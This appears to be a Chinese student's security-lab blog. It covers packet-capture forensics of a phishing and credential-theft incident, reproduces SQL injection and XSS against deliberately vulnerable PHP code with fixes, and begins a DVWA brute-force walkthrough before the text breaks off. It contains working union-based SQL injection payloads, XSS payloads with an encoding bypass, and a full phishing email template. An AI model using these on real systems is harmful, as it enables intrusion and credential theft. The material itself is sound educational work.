-<p>可以发现由session有<a href="mailto:&#108;&#105;&#120;&#x69;&#97;&#111;&#x66;&#101;&#x69;&#x40;&#116;&#51;&#x73;&#x65;&#x63;&#x2e;&#99;&#99;">&#108;&#105;&#120;&#x69;&#97;&#111;&#x66;&#101;&#x69;&#x40;&#116;&#51;&#x73;&#x65;&#x63;&#x2e;&#99;&#99;</a>，it@t3sec.cc。且 显示的源地址是<code>111.206.82.164</code>是攻击机，说明被劫持了。在途中的<code>POST</code>请求中的账号密码也被窃取<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212225710772.png" alt="image-20201212225710772"></p>
-<p>到这里，就可以回答问题了。</p>
-<ul>
-<li>黑客的攻击ip是多少，被攻击的内网IP是多少？</li>
-</ul>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">黑客攻击ip：111.206.82.164</span><br><span class="line">被攻击的内网ip：172.16.61.206，172.16.61.199，172.16.61.200</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>哪些帐号被黑客窃取了(填写帐号名)</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">it@t3sec.cc,admin,lixiaofei</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li> 黑客的服务器ip是多少</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111.206.82.164</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>黑客使用了什么工具？</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awvs、sqlmap、angel.php(大马)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>黑客给哪2个帐号发送了钓鱼邮件？</li>
-</ul>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lixiaofei@t3sec.cc</span><br><span class="line">it@t3sec.cc</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>黑客伪造的邮件标题和内容是什么？</li>
-</ul>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">标题：系统升级，请大家注意</span><br><span class="line"></span><br><span class="line">内容：</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot;&gt;</span><br><span class="line">&lt;style type=&quot;text/css&quot; style=&quot;display:none;&quot;&gt;&lt;!-- P &#123;margin-top:0;margin-bottom:0;&#125; --&gt;&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body dir=&quot;ltr&quot;&gt;</span><br><span class="line">&lt;div id=&quot;divtagdefaultwrapper&quot; style=&quot;font-size:12pt;color:#000000;background-color:#FFFFFF;font-family:Calibri,Arial,Helvetica,sans-serif;&quot;&gt;</span><br><span class="line">&lt;p&gt;&lt;/p&gt;</span><br><span class="line">&lt;div style=&quot;line-height:1.7;color:#000000;font-size:14px;font-family:Arial&quot;&gt;</span><br><span class="line">&lt;div&gt;大家好。&lt;br&gt;</span><br><span class="line">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 鉴于公司网络架构改动，部分应用需要升级，旧版本mail、oa、crm等系统逐步将替换，请大家登录&lt;a _src=&quot;http://118.194.196.232:8084/get.php&quot; href=&quot;http://118.194.196.232:8084/get.php&quot;&gt;http://118.194.196.232:8084/get.php&lt;/a&gt; 填写自己的帐号以便配合系统升级。</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&amp;nbsp;&amp;nbsp;&amp;nbsp; 谢谢大家！ &lt;br&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;span&gt;&lt;/span&gt;&lt;br&gt;</span><br><span class="line">&lt;p&gt;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>黑客使用了哪个邮箱给员工发送了钓鱼邮件？</li>
-</ul>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">两个邮箱：</span><br><span class="line">xsser@live.cn</span><br><span class="line">clickjacking@163.com</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>哪两个员工点开了黑客的<code>email</code>链接(填写员工<code>email</code>地址)</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">it@t3sec.cc</span><br><span class="line">lixiaofei@t3sec.cc</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>请指出黑客使用的扫描器指纹是什么？(简称)</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th align="left">扫描器指纹</th>
-<th align="left">扫描器</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left"><code>vulnweb</code>, <code>acunetix</code>,<code>acunetix_wvs_test</code>,<code>acunetix/wvs</code>,<code>acunetix_test</code></td>
-<td align="left"><code>awvs</code></td>
-</tr>
-<tr>
-<td align="left"><code>sqlmap</code></td>
-<td align="left"><code>sqlmap</code></td>
-</tr>
-<tr>
-<td align="left"><code>eval</code>,<code>pass</code></td>
-<td align="left"><code>angel.php</code></td>
-</tr>
-</tbody></table>
-<h2 id="铁人三项数据分析题目"><a href="#铁人三项数据分析题目" class="headerlink" title="铁人三项数据分析题目"></a>铁人三项数据分析题目</h2><p>发现数据包包括了练习题目2的数据包，且问题一致。于是其他的包，主要筛选出除了已经出现的IP的其他的IP。</p>
-<ul>
-<li>数据采集D_eth0_NS_20160804_091808</li>
-</ul>
-<p><code>http &amp;&amp; ip.addr == 111.206.82.164 &amp;&amp; not (ip.addr == 172.16.61.206 &amp;&amp; ip.addr == 172.16.61.199 &amp;&amp; ip.addr == 172.16.61.200)</code></p>
-<p>可以看见还攻击了172.16.61.210和172.16.60.197</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212233109001.png" alt="image-20201212233109001"></p>
-<p>具体查看，发现攻击者对<code>172.16.60.197</code>，进行<code>awvs</code>扫描和爆破登录但是没有成功。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212233555600.png" alt="image-20201212233555600"></p>
-<p>攻击者登录<code>172.16.61.210</code>中的<code>phpcms</code>后台成功，默认账号密码为<code>phpcms</code>，<code>phpcms</code>。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212234944558.png" alt="image-20201212234944558"></p>
-<p>在其他包里没有发现什么新的东西。因此最终答案。</p>
-<ul>
-<li>黑客的攻击ip是多少，被攻击的内网IP是多少？</li>
-</ul>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">黑客攻击ip：111.206.82.164</span><br><span class="line">被攻击的内网ip：172.16.61.206，172.16.61.199，172.16.61.200 增加（172.16.61.210，172.16.60.197）</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>哪些帐号被黑客窃取了(填写帐号名)</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">it@t3sec.cc,admin,lixiaofei</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li> 黑客的服务器ip是多少</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111.206.82.164</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>黑客使用了什么工具？</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awvs、sqlmap、angel.php(大马)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>黑客给哪2个帐号发送了钓鱼邮件？</li>
-</ul>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lixiaofei@t3sec.cc</span><br><span class="line">it@t3sec.cc</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>黑客伪造的邮件标题和内容是什么？</li>
-</ul>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">标题：系统升级，请大家注意</span><br><span class="line"></span><br><span class="line">内容：</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot;&gt;</span><br><span class="line">&lt;style type=&quot;text/css&quot; style=&quot;display:none;&quot;&gt;&lt;!-- P &#123;margin-top:0;margin-bottom:0;&#125; --&gt;&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body dir=&quot;ltr&quot;&gt;</span><br><span class="line">&lt;div id=&quot;divtagdefaultwrapper&quot; style=&quot;font-size:12pt;color:#000000;background-color:#FFFFFF;font-family:Calibri,Arial,Helvetica,sans-serif;&quot;&gt;</span><br><span class="line">&lt;p&gt;&lt;/p&gt;</span><br><span class="line">&lt;div style=&quot;line-height:1.7;color:#000000;font-size:14px;font-family:Arial&quot;&gt;</span><br><span class="line">&lt;div&gt;大家好。&lt;br&gt;</span><br><span class="line">&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 鉴于公司网络架构改动，部分应用需要升级，旧版本mail、oa、crm等系统逐步将替换，请大家登录&lt;a _src=&quot;http://118.194.196.232:8084/get.php&quot; href=&quot;http://118.194.196.232:8084/get.php&quot;&gt;http://118.194.196.232:8084/get.php&lt;/a&gt; 填写自己的帐号以便配合系统升级。</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&amp;nbsp;&amp;nbsp;&amp;nbsp; 谢谢大家！ &lt;br&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;span&gt;&lt;/span&gt;&lt;br&gt;</span><br><span class="line">&lt;p&gt;&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>黑客使用了哪个邮箱给员工发送了钓鱼邮件？</li>
-</ul>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">两个邮箱：</span><br><span class="line">xsser@live.cn</span><br><span class="line">clickjacking@163.com</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>哪两个员工点开了黑客的<code>email</code>链接(填写员工<code>email</code>地址)</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">it@t3sec.cc</span><br><span class="line">lixiaofei@t3sec.cc</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>请指出黑客使用的扫描器指纹是什么？(简称)</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th align="left">扫描器指纹</th>
-<th align="left">扫描器</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left"><code>vulnweb</code>, <code>acunetix</code>,<code>acunetix_wvs_test</code>,<code>acunetix/wvs</code>,<code>acunetix_test</code></td>
-<td align="left"><code>awvs</code></td>
-</tr>
-<tr>
-<td align="left"><code>sqlmap</code></td>
-<td align="left"><code>sqlmap</code></td>
-</tr>
-<tr>
-<td align="left"><code>eval</code>,<code>pass</code></td>
-<td align="left"><code>angel.php</code></td>
-</tr>
-</tbody></table>
-<h2 id="3-课程sqli、xss复现"><a href="#3-课程sqli、xss复现" class="headerlink" title="3 课程sqli、xss复现"></a>3 课程sqli、xss复现</h2><h3 id="sqli-漏洞复现"><a href="#sqli-漏洞复现" class="headerlink" title="sqli 漏洞复现"></a>sqli 漏洞复现</h3><p>php源代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name=$_POST[<span class="string">&quot;id&quot;</span>];</span><br><span class="line">$passwd=$_POST[<span class="string">&quot;passwd&quot;</span>];</span><br><span class="line">$db= mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Fail&quot;</span>);</span><br><span class="line">mysqli_select_db($db,<span class="string">&quot;study_sqli&quot;</span>);</span><br><span class="line">$sql=<span class="string">&quot;select * from user where id=&#x27;<span class="subst">$name</span>&#x27; and passwd=&#x27;<span class="subst">$passwd</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;&lt;table border=1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;&lt;tr&gt;&lt;th&gt;ID&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($result= mysqli_query($db,$sql))&#123;</span><br><span class="line"><span class="keyword">while</span>($array=mysqli_fetch_row($result))&#123;</span><br><span class="line">    printf(<span class="string">&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;tr&gt;&quot;</span>,$array[<span class="number">0</span>],$array[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;&lt;/table&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>分析sql语句<code>select * from user where id=&#39;$name&#39; and passwd=&#39;$passwd&#39;</code>可以知道存在字符型注入漏洞。</p>
-<ul>
-<li><p>验证字符型注入</p>
-<p>输入admin’ and ‘1’=’2’ #</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212175800228.png" alt="image-20201212175800228"></p>
-</li>
-</ul>
-<p>结果为空<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212175430810.png" alt="image-20201212175430810"></p>
-<p>输入admin’ and ‘1’=’1’ #</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212175720802.png" alt="image-20201212175720802"></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212175733839.png" alt="image-20201212175733839"></p>
-<p>成功，说明and被执行。</p>
-<p><strong>原理解释：</strong></p>
-<p>首先，admin’将第一个’闭合，之后and ‘1’=’1’ 或者 and ‘1’=’2’是完整的查询。考虑到这是两个输入，使用#注释掉之后的语句，password可以任意填。</p>
-<ul>
-<li>确定sql语句的字段数</li>
-</ul>
-<p>要获取数据库名、表明等，一定会用到union查询。而union查询需要与主查询的列数相同，所以要先确定sql语句的字段数</p>
-<p>利用union的特性来猜测。</p>
-<p>输入<code> admin&#39; union select 1 #</code>。失败<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212181640702.png" alt="image-20201212181640702"></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212181655614.png" alt="image-20201212181655614"></p>
-<p>输入<code> admin&#39; union select 1,2 #</code>，成功</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212181725925.png" alt="image-20201212181725925"></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212181740450.png" alt="image-20201212181740450"></p>
-<p>所以可以确定字段数为两个。</p>
-<ul>
-<li>获得数据库名</li>
-</ul>
-<p>有了上述的基础，只需要union查询中加一个<code>select database() </code>就可以得到数据库名。</p>
-<p>输入<code>admin&#39; union select 1,database() #</code>成功得到数据库名“study_sqli”</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212182113902.png" alt="image-20201212182113902"></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212182122278.png" alt="image-20201212182122278"></p>
-<ul>
-<li>获得表名</li>
-</ul>
-<p>类似于获得数据库名的步骤，只需要考虑如何查询表名即可。</p>
-<p>查询语句<code>select group_concat(table_name) from information_schema.tables where table_schema=database()</code>是一个通用的查询语句。</p>
-<p>information_schema数据库是MySQL自带的，它提供了访问数据库元数据的方式。元数据就是关于数据的数据也就是数据库名、表名等。</p>
-<p>因此，输入<code>admin&#39; union  select 1, group_concat(table_name) from information_schema.tables where table_schema=database()#</code>成功得到表名users。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212183402320.png" alt="image-20201212183402320"></p>
-<ul>
-<li>获得列名</li>
-</ul>
-<p>知道表名，获得列名就变得十分简单。</p>
-<p><code>select group_concat(column_name) from information_schema.columns where table_name=&#39;表名&#39;</code>这也是一个比较通用的写法。</p>
-<p>最终输入时，加上了一个限制条件为table_schema=database()，是为了防止查询到其他数据库中相同表名的列。</p>
-<p>输入<code>admin&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()</code> #`成功获得列名。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212183134546.png" alt="image-20201212183134546"></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212183858597.png" alt="image-20201212183858597"></p>
-<ul>
-<li>获取数据</li>
-</ul>
-<p>知道列名，就可以获取表里的数据。</p>
-<p>输入<code>admin&#39; or 1=1 union select 1,group_concat(id,passwd) from users #</code>    admin’ or 1=1永真，结合后面的union语句，就可以得到所有用户的数据。</p>
-<p><img src="C:/Users/lsh/AppData/Roaming/Typora/typora-user-images/image-20201212184505545.png" alt="image-20201212184505545"></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212184527129.png" alt="image-20201212184527129"></p>
-<h3 id="sqli-漏洞修复"><a href="#sqli-漏洞修复" class="headerlink" title="sqli 漏洞修复"></a>sqli 漏洞修复</h3><p>sql语句的预编译是防御sql注入的最佳方法。预编译，是先将sql语句编译好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划。因此输入的参数不会影响到sql语句的结构。成功做到将程序和数据分开，有效的防御了sql注入攻击。</p>
-<p>php有提供预编译的功能，只需要使用即可。</p>
-<p>修改后的代码如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name=$_POST[<span class="string">&quot;id&quot;</span>];</span><br><span class="line">$passwd=$_POST[<span class="string">&quot;passwd&quot;</span>];</span><br><span class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;study_sqli&#x27;</span>);</span><br><span class="line">$stmt = $mysqli-&gt;prepare(<span class="string">&quot;select * from users where id=? and passwd=?&quot;</span>);</span><br><span class="line">$stmt-&gt;bind_param(<span class="string">&#x27;ss&#x27;</span>,$name,$passwd);</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;&lt;table border=1&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;&lt;tr&gt;&lt;th&gt;ID&lt;/th&gt;&lt;th&gt;Password&lt;/th&gt;&lt;tr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($mysqli-&gt;affected_rows)&#123;</span><br><span class="line">	$result=$stmt-&gt;get_result();</span><br><span class="line">	<span class="keyword">while</span> ($row=$result-&gt;fetch_assoc()) &#123;</span><br><span class="line">		printf(<span class="string">&quot;&lt;tr&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;%s&lt;/td&gt;&lt;tr&gt;&quot;</span>,$row[<span class="string">&quot;name&quot;</span>],$row[<span class="string">&quot;passwd&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;&lt;/table&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="XSS漏洞复现"><a href="#XSS漏洞复现" class="headerlink" title="XSS漏洞复现"></a>XSS漏洞复现</h3><p>源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;h1&gt;please input your name:&lt;&#x2F;h1&gt;</span><br><span class="line">	&lt;form action&#x3D;&quot;welcome.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">		&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;</span><br><span class="line">		&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &gt;</span><br><span class="line">	&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">setcookie(&#39;name&#39;,&#39;lsh&#39;);</span><br><span class="line">echo $_POST[&#39;username&#39;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201214082643819.png" alt="image-20201214082643819"></p>
-<p>当服务器输出我们的内容，并且内容回显到客户端的时候，如果我们一开始输入的内容很正常的话，那么回显我们输入的内容是没有问题的，但是如果我们输入的内容是浏览器可以解析的代码的时候，浏览器就会执行我们想要他执行的代码。</p>
-<p>输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201214083433435.png" alt="image-20201214083433435"></p>
-<p>有时候，会过滤<code>&lt;script&gt;</code>标签，这时候可以通过img、iframe等其它危险的标签来执行程序。</p>
-<p>输入<code>&lt;img src=1 onerror=alert(/img/)&gt;</code>，成功得到弹窗。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201214083930675.png" alt="image-20201214083930675"></p>
-<p>如果网页对&lt;，&gt;,’，”等字符进行过滤，就需要进行编码绕过。</p>
-<p>lE默认采用UNICODE编码，HTML编码可用&amp;#ASCI方式来写。</p>
-<p>输入如下代码，与<code>&lt;img src=&quot;javascript:alert(&#39;\xss、&#39;)&quot;&gt;</code>效果是一样的。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img</span><br><span class="line">src&#x3D;&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&#39;&amp;#88;&amp;#83;&amp;#83;&#39;&amp;#41;&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201214083433435.png" alt="image-20201214083433435"></p>
-<p>输入<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>可以显示cookie。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201214084720002.png" alt="image-20201214084720002"></p>
-<h3 id="XSS漏洞修复"><a href="#XSS漏洞修复" class="headerlink" title="XSS漏洞修复"></a>XSS漏洞修复</h3><p>对输出进行html编码可以避免执行脚本。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">setcookie(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;lsh&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> htmlspecialchars($_POST[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="4-dvwa"><a href="#4-dvwa" class="headerlink" title="4 dvwa"></a>4 dvwa</h2><ul>
-<li><p>实验环境</p>
-<p>Damn Vulnerable Web Application (DVWA) v1.10</p>
-</li>
-</ul>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212164645298.png" alt="image-20201212164645298"></p>
-<h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><p>首先设置好浏览器代理，这里使用一个插件就不用每次都手动设置。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213100318762.png" alt="image-20201213100318762"></p>
-<ol>
-<li><strong>安全级别 low</strong></li>
-</ol>
-<p>首先拦截登录，并发送给爆破模块。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213100522847.png" alt="image-20201213100522847"></p>
-<p>进行基本设置</p>
-<ul>
-<li>先将选择的清空</li>
-<li>再选中需要爆破的字段</li>
-<li>由于有两个需要爆破，选择模式Cluster bomb</li>
-</ul>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213100629362.png" alt="image-20201213100629362"></p>
-<p>设置payload</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212234240331.png" alt="image-20201212234240331"></p>
-<p>设置线程</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212234259179.png" alt="image-20201212234259179"></p>
-<p>开始攻击，发现这个返回长度与其他不一致。查看相应，可以知道这就是账户和密码。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213103139297.png" alt="image-20201213103139297"></p>
-<p>登录成功的界面</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201213103302154.png" alt="image-20201213103302154"></p>
-<ol start="2">
-<li><strong>安全级别 medium</strong></li>
-</ol>
-<p>服务器端源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username 